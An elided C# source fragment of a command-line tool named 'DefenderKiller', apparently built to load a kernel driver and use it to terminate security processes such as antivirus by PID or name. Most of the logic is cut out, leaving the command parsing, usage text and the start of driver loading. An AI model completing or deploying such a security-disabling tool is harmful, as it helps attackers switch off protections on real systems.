...
namespace DefenderKiller
{
    class Program
    {
        // Constants
        private const string ServiceName = "DefenderKiller";
        private const string DevicePath = "\\\\.\\DefenderKiller";
        ...
        private static void Main(string[] args)
        {
            ...
            try
            {
                ...
                else if (cmd == "kill")
                {
                    if (args.Length < 2)
                    {
                        Console.WriteLine("[-] Usage: DefenderKiller.exe kill <PID | process_name>");
                        return;
                    }
                    CmdKill(args[1]);
                }
  ...
  Usage:
    DefenderKiller.exe load <driver_path>
    DefenderKiller.exe kill <PID | process_name>
...
");
        ...
        private static void CmdLoad(string driverPath)
        {
            ...
            try
            {
                ...
                {
                    // DeviceName
                    byte[] dnData = Encoding.Unicode.GetBytes("DefenderKiller\0");
